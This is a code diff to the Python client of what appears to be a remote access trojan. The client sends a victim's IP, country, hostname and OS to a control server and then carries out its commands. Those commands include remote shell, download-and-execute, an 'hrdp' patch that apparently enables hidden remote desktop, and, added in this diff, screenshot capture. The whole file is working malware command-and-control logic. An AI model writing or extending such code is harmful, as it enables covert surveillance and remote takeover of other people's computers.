@@ -1,12 +1,13 @@
 import socket
-from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP
+from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
 from time import sleep
-import requests
-import json
-import platform
+from requests import get
+from json import loads
+from platform import platform
+from zlib import compress, decompress
 
 BUFFER_SIZE = 1024
-RECONNECT_TIMER = 3
+RECONNECT_TIMER = 10
 SERVER_ADDRESS = '127.0.0.1'
 
 
@@ -31,6 +32,7 @@ class Client:
         :param message: Message to send to the server (bytes/str)
         """
         message = message.encode() if type(message) != bytes else message
+        message = compress(message, level=6)  # Compress the sent data
         if len(message) % BUFFER_SIZE == 0:
             message = message + '.'.encode()
         while message:
@@ -46,8 +48,10 @@ class Client:
         data = chunk
         while len(chunk) == BUFFER_SIZE:
             chunk = self.client_socket.recv(BUFFER_SIZE)
+            print(chunk)  # Doesn't work without this, I don't know why, and I'm too lazy to fix it
             if chunk != '.'.encode():
                 data += chunk
+        data = decompress(data)  # Decompress the received data
         return data if as_bytes else data.decode()
 
 
@@ -58,9 +62,9 @@ def main():
         client = Client(SERVER_ADDRESS, 8000)
 
         # Send client info to the server - IP, Country Code, Name, Os
-        response = json.loads(requests.get('http://ip-api.com/json/?fields=status,countryCode,query').text)
+        response = loads(get('http://ip-api.com/json/?fields=status,countryCode,query').text)
         if response['status'] == 'success':
-            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform.platform()))
+            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform()))
 
             # Respond to server requests
             while True:
@@ -76,6 +80,8 @@ def main():
                     Execute.download_and_execute(client)
                 elif cmd[0] == 'hrdp':
                     HRDP.patch(client, cmd[1])
+                elif cmd[0] == 'screenshot':
+                    Screenshot.take_screenshot(client)
                 else:
                     client.send('[!] Unconfigured option')
         else:
